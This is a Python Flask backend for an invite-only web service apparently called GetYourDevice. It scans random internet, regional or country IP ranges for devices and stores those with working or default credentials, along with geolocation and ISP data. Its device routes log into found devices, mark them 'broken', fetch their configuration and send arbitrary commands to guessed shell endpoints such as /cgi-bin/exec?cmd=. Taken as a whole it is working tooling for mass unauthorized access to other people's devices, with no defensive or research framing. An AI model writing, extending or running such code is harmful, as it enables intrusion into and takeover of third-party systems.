import os, json, time, threading, uuid
from datetime import datetime, timezone
from functools import wraps
from flask import Flask, render_template, request, jsonify
import requests

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'))

FIREBASE_WEB_API_KEY = os.environ.get("FIREBASE_WEB_API_KEY", "")
FIREBASE_SERVICE_ACCOUNT = os.environ.get("FIREBASE_SERVICE_ACCOUNT", "")
FIREBASE_PROJECT_ID = os.environ.get("FIREBASE_PROJECT_ID", "")

fb_service = None
fb_db = None
if FIREBASE_SERVICE_ACCOUNT:
    import firebase_admin
    from firebase_admin import credentials, firestore, auth
    try:
        cred = credentials.Certificate(json.loads(FIREBASE_SERVICE_ACCOUNT))
        fb_service = firebase_admin.initialize_app(cred)
        fb_db = firestore.client()
        FIREBASE_PROJECT_ID = FIREBASE_PROJECT_ID or cred.project_id
    except Exception as e:
        print(f"[!] Firebase init error: {e}")

FIREBASE_AUTH_URL = "https://identitytoolkit.googleapis.com/v1/accounts"

def fb_req(endpoint, data):
    if not FIREBASE_WEB_API_KEY:
        return None
    try:
        r = requests.post(f"{FIREBASE_AUTH_URL}:{endpoint}?key={FIREBASE_WEB_API_KEY}", json=data, timeout=10)
        return r.json() if r.status_code in (200, 201) else None
    except:
        return None

def verify_fb_token(id_token):
    if not fb_service:
        return None
    try:
        decoded = auth.verify_id_token(id_token)
        return decoded
    except:
        return None

def get_user_by_token():
    auth_h = request.headers.get("Authorization", "")
    if not auth_h.startswith("Bearer "):
        return None
    token = auth_h[7:]
    decoded = verify_fb_token(token)
    if decoded:
        return decoded
    return None

def require_auth(f):
    @wraps(f)
    def wrapper(*a, **kw):
        user = get_user_by_token()
        if not user:
            return jsonify({"error": "unauthorized"}), 401
        return f(user=user, *a, **kw)
    return wrapper

def fb_get_user_by_email(email):
    if not fb_service:
        return None
    try:
        return auth.get_user_by_email(email)
    except:
        return None

def fb_create_user(email, password):
    if not fb_service:
        return None
    try:
        return auth.create_user(email=email, password=password)
    except Exception as e:
        return {"error": str(e)}

def fb_collection(name):
    return fb_db.collection(name) if fb_db else None

def fb_doc(collection, doc_id):
    c = fb_collection(collection)
    return c.document(doc_id) if c else None

lock = threading.Lock()

INVITE_ONLY = os.environ.get("INVITE_ONLY", "true").lower() == "true"

# ─────────────── Auth routes ───────────────

@app.route("/api/auth/register", methods=["POST"])
def api_register():
    body = request.get_json(force=True)
    id_token = body.get("id_token", "")
    invite = body.get("invite_code", "").strip()

    if not id_token:
        return jsonify({"error": "id_token required"}), 400

    decoded = verify_fb_token(id_token)
    if not decoded:
        return jsonify({"error": "invalid token"}), 401

    uid = decoded.get("uid", "")
    email = decoded.get("email", "").strip().lower()
    if not email:
        email = body.get("email", "").strip().lower()
    username = body.get("username", email.split("@")[0])

    if INVITE_ONLY:
        if not invite:
            return jsonify({"error": "invitation code required"}), 400
        invites_coll = fb_collection("inviteCodes")
        if invites_coll:
            q = invites_coll.where("code", "==", invite).where("status", "==", "active").limit(1).get()
            if not q or len(q) == 0:
                return jsonify({"error": "invalid or used invitation code"}), 400
            inv_doc = q[0]
            inv_ref = inv_doc.reference

    users_coll = fb_collection("users")
    if users_coll:
        existing = users_coll.document(uid).get()
        if existing.exists:
            return jsonify({"error": "user already registered"}), 409
        users_coll.document(uid).set({
            "email": email,
            "username": username,
            "avatar_url": "",
            "bio": "",
            "created_at": datetime.now(timezone.utc).isoformat(),
            "community": "",
        })

    if INVITE_ONLY and invite:
        inv_ref.update({"status": "used", "used_by": uid, "used_at": datetime.now(timezone.utc).isoformat()})

    audit = fb_collection("auditLogs")
    if audit:
        audit.add({"action": "register", "timestamp": datetime.now(timezone.utc).isoformat(), "target_user": uid})

    return jsonify({"status": "ok", "token": id_token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/login", methods=["POST"])
def api_login():
    body = request.get_json(force=True)
    id_token = body.get("id_token", "")

    if not id_token:
        return jsonify({"error": "id_token required"}), 400

    decoded = verify_fb_token(id_token)
    if not decoded:
        return jsonify({"error": "invalid token"}), 401

    uid = decoded.get("uid", "")
    email = decoded.get("email", "").strip().lower()
    users_coll = fb_collection("users")
    username = email.split("@")[0] if email else uid
    if users_coll:
        doc = users_coll.document(uid).get()
        if doc.exists:
            user_data = doc.to_dict()
            username = user_data.get("username", username)
            email = user_data.get("email", email)

    return jsonify({"status": "ok", "token": id_token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/me", methods=["GET"])
@require_auth
def api_me(user):
    uid = user.get("uid", "")
    email = user.get("email", "")
    data = {"email": email, "uid": uid}
    users_coll = fb_collection("users")
    if users_coll:
        doc = users_coll.document(uid).get()
        if doc.exists:
            data.update(doc.to_dict())
    return jsonify({"user": data})

@app.route("/api/auth/logout", methods=["POST"])
def api_logout():
    return jsonify({"status": "ok"})

@app.route("/api/auth/check-invite", methods=["GET"])
def api_check_invite():
    code = request.args.get("code", "")
    if not code:
        return jsonify({"valid": False}), 400
    if not INVITE_ONLY:
        return jsonify({"valid": True})
    invites_coll = fb_collection("inviteCodes")
    if invites_coll:
        q = invites_coll.where("code", "==", code).where("status", "==", "active").limit(1).get()
        return jsonify({"valid": len(q) > 0})
    return jsonify({"valid": False})

# ─────────────── Scan results (Firestore) ───────────────

def _results_ref():
    return fb_collection("scanResults") if fb_db else None

def _items_ref():
    return fb_collection("scanResultItems") if fb_db else None

@app.route("/api/results", methods=["GET"])
@require_auth
def api_list_results(user):
    uid = user.get("uid", "")
    ref = _results_ref()
    if not ref:
        return jsonify([])
    docs = ref.where("user_id", "==", uid).order_by("created_at", direction=firestore.Query.DESCENDING).limit(100).stream()
    out = []
    for d in docs:
        data = d.to_dict()
        data["id"] = d.id
        out.append(data)
    return jsonify(out)

@app.route("/api/results/<result_id>", methods=["GET"])
@require_auth
def api_get_result(user, result_id):
    ref = _results_ref()
    if not ref:
        return jsonify({"error": "no db"}), 500
    doc = ref.document(result_id).get()
    if not doc.exists:
        return jsonify({"error": "not found"}), 404
    data = doc.to_dict()
    if data.get("user_id") != user.get("uid"):
        return jsonify({"error": "forbidden"}), 403
    data["id"] = doc.id
    return jsonify(data)

@app.route("/api/results/<result_id>", methods=["DELETE"])
@require_auth
def api_delete_result(user, result_id):
    ref = _results_ref()
    if not ref:
        return jsonify({"status": "error"})
    doc = ref.document(result_id).get()
    if not doc.exists or doc.to_dict().get("user_id") != user.get("uid"):
        return jsonify({"error": "not found"}), 404
    ref.document(result_id).delete()
    items = _items_ref()
    if items:
        batch = fb_db.batch()
        q = items.where("result_id", "==", result_id).stream()
        for d in q:
            batch.delete(d.reference)
        batch.commit()
    return jsonify({"status": "ok"})

@app.route("/api/results/<result_id>/items", methods=["GET"])
@require_auth
def api_result_items(user, result_id):
    ref = _items_ref()
    if not ref:
        return jsonify([])
    docs = ref.where("result_id", "==", result_id).order_by("id").stream()
    out = []
    for d in docs:
        data = d.to_dict()
        data["id"] = int(data.get("id", 0))
        out.append(data)
    return jsonify(out)

@app.route("/api/results/<result_id>/items/broken", methods=["GET"])
@require_auth
def api_broken_items(user, result_id):
    ref = _items_ref()
    if not ref:
        return jsonify([])
    docs = ref.where("result_id", "==", result_id).where("broken", "==", True).stream()
    out = []
    for d in docs:
        data = d.to_dict()
        data["id"] = int(data.get("id", 0))
        out.append(data)
    return jsonify(out)

# ─────────────── Device interaction ───────────────

@app.route("/api/devices/<item_id>/test", methods=["POST"])
@require_auth
def api_test_device(user, item_id):
    ref = _items_ref()
    if not ref:
        return jsonify({"error": "db error"}), 500
    doc = ref.document(item_id).get()
    if not doc.exists:
        return jsonify({"error": "not found"}), 404
    item = doc.to_dict()
    ip = item.get("ip", "")
    port = item.get("port", 80)
    username = item.get("username", "admin")
    password = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"

    result = {"status": "error", "message": ""}
    try:
        r = requests.get(f"{scheme}://{ip}:{port}", auth=(username, password),
                         timeout=10, allow_redirects=False, verify=False)
        result["status_code"] = r.status_code
        result["headers"] = dict(r.headers)
        result["body_preview"] = r.text[:2000]
        if r.status_code in (200, 301, 302):
            result["status"] = "ok"
            result["message"] = "Credentials work"
            ref.document(item_id).update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()})
        else:
            result["message"] = f"HTTP {r.status_code}"
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)

@app.route("/api/devices/<item_id>/access", methods=["POST"])
@require_auth
def api_access_device(user, item_id):
    ref = _items_ref()
    if not ref:
        return jsonify({"error": "db error"}), 500
    doc = ref.document(item_id).get()
    if not doc.exists or not doc.to_dict().get("broken"):
        return jsonify({"error": "device not found or not broken yet"}), 404
    item = doc.to_dict()

    body = request.get_json(force=True) or {}
    action = body.get("action", "info")
    ip = item["ip"]
    port = item["port"]
    u = item.get("username", "admin")
    p = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"
    auth = (u, p)

    result = {"status": "error", "message": ""}
    try:
        if action == "info":
            r = requests.get(f"{scheme}://{ip}:{port}", auth=auth, timeout=10, verify=False)
            result = {"status": "ok", "status_code": r.status_code, "headers": dict(r.headers), "body": r.text[:5000]}
        elif action == "exec":
            cmd = body.get("command", "id")
            r = requests.get(f"{scheme}://{ip}:{port}/cgi-bin/exec?cmd={cmd}", auth=auth, timeout=10, verify=False)
            result = {"status": "ok", "output": r.text[:5000]}
        elif action == "config":
            r = requests.get(f"{scheme}://{ip}:{port}/config", auth=auth, timeout=10, verify=False)
            result = {"status": "ok", "config": r.text[:5000]}
        elif action == "shell":
            cmd = body.get("command", "id")
            for ep in ["/exec", "/cgi-bin/exec", "/shell", "/cmd", "/console"]:
                try:
                    r = requests.get(f"{scheme}://{ip}:{port}{ep}?cmd={cmd}", auth=auth, timeout=5, verify=False)
                    if r.status_code == 200:
                        result = {"status": "ok", "endpoint": ep, "output": r.text[:5000]}
                        break
                except:
                    continue
            if result.get("status") != "ok":
                result = {"status": "ok", "message": "No shell endpoint found, creds work", "suggested_url": f"{scheme}://{ip}:{port}"}
        else:
            result = {"error": f"unknown action: {action}"}
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)

# ─────────────── Scan API ───────────────

@app.route("/api/scan", methods=["POST"])
@require_auth
def api_scan(user):
    body = request.get_json(force=True)
    target = body.get("target", "")
    region = body.get("region", "")
    internet = body.get("internet", False)
    max_ips = int(body.get("max_ips", 500))
    threads = int(body.get("threads", 10))
    ports = body.get("ports", "fast")
    country = body.get("country", None)
    do_geo = body.get("geo", False)

    from GetYourDevice import (
        generate_region_ips, generate_internet_ips, generate_ips,
        scan_single, SCAN_PORTS, ALL_PORTS, GeoEnricher, REGION_CONFIG
    )

    selected_ports = ALL_PORTS if ports == "all" else SCAN_PORTS
    cap = min(max_ips, 5000)

    include_countries = None
    if country:
        include_countries = set(c.strip().upper() for c in country.split(",") if c.strip())

    if region and region in REGION_CONFIG:
        ips = generate_region_ips(region, cap, include_countries=include_countries)
    elif target:
        ips = generate_ips(target, cap)
    else:
        ips = generate_internet_ips(cap)

    results = []
    for ip in ips:
        try:
            res = scan_single(ip, no_auth_only=False, ports=selected_ports)
            if res:
                results.extend(res)
        except Exception:
            pass

    if do_geo and results:
        geo_ips = list(set(r["ip"] for r in results))
        geo_data = GeoEnricher.enrich_batch(geo_ips)
        for r in results:
            g = geo_data.get(r["ip"], {})
            r.update(g)

    uid = user.get("uid", "")
    results_ref = _results_ref()
    items_ref = _items_ref()
    creds_count = sum(1 for r in results if r.get("auth_found"))
    open_count = sum(1 for r in results if r.get("no_auth"))
    if results and results_ref and items_ref:
        doc_ref = results_ref.document()
        rid = doc_ref.id
        doc_ref.set({
            "user_id": uid,
            "total_scanned": len(ips),
            "results_count": len(results),
            "creds_count": creds_count,
            "open_count": open_count,
            "region": region or "internet",
            "ports": ports,
            "created_at": datetime.now(timezone.utc).isoformat(),
        })
        for i, r in enumerate(results):
            item_ref = items_ref.document()
            item_ref.set({
                "result_id": rid,
                "id": i,
                "ip": r.get("ip"), "port": r.get("port"),
                "url": r.get("url"), "device": r.get("device"),
                "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
                "username": r.get("username"), "password": r.get("password"),
                "note": r.get("note"), "status_code": r.get("status_code"),
                "country": r.get("country"), "country_code": r.get("country_code"),
                "region_name": r.get("region"), "city": r.get("city"),
                "lat": r.get("lat"), "lon": r.get("lon"),
                "org": r.get("org"), "isp": r.get("isp"),
                "as_info": r.get("as"),
                "broken": False,
            })

    return jsonify({
        "status": "ok",
        "total_scanned": len(ips),
        "results_count": len(results),
        "results": results,
    })

# ─────────────── Invite code management ───────────────

@app.route("/api/admin/invites", methods=["GET"])
@require_auth
def api_list_invites(user):
    ref = fb_collection("inviteCodes")
    if not ref:
        return jsonify([])
    docs = ref.stream()
    out = []
    for d in docs:
        data = d.to_dict()
        data["id"] = d.id
        out.append(data)
    return jsonify(out)

@app.route("/api/admin/invites", methods=["POST"])
@require_auth
def api_create_invite(user):
    body = request.get_json(force=True)
    code = body.get("code", uuid.uuid4().hex[:8].upper())
    ref = fb_collection("inviteCodes")
    if ref:
        ref.add({
            "code": code,
            "status": "active",
            "issuer": user.get("uid", ""),
            "created_at": datetime.now(timezone.utc).isoformat(),
        })
    return jsonify({"status": "ok", "code": code})

# ─────────────── Main app route ───────────────

@app.route("/")
def index():
    return render_template("app.html")

@app.route("/app")
def app_spa():
    return render_template("app.html")

# ─────────────── Health check ───────────────

@app.route("/api/health")
def api_health():
    return jsonify({
        "status": "ok",
        "time": datetime.now(timezone.utc).isoformat(),
        "version": "7.1",
        "firebase": bool(fb_service),
        "invite_only": INVITE_ONLY,
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    debug = os.environ.get("VERCEL") != "1"
    print(f"[*] GYD on Firebase — http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=debug)
